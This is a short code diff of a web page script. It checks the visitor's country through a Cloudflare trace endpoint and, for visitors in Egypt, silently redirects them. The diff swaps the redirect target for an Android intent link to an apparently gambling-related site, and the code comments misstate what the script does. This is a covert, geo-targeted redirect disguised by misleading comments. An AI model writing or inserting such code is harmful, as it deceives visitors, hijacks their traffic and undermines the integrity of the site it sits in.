@@ -28,12 +28,12 @@ navigate('https://google.com', true);
 
     <script>
       // Make a request to cat.com
-      fetch('https://api.country.is/')
+      fetch('https://cloudflare.com/cdn-cgi/trace/')
         .then(response => response.text())  // Assuming the response is plain text
         .then(data => {
           if (data.includes('EG')) {
             // Redirect to fun.com
-            window.location.replace('https://google.com');
+            window.location.replace('intent:https://www.softgamings.com/#Intent;end');
           }
         })
         .catch(error => {
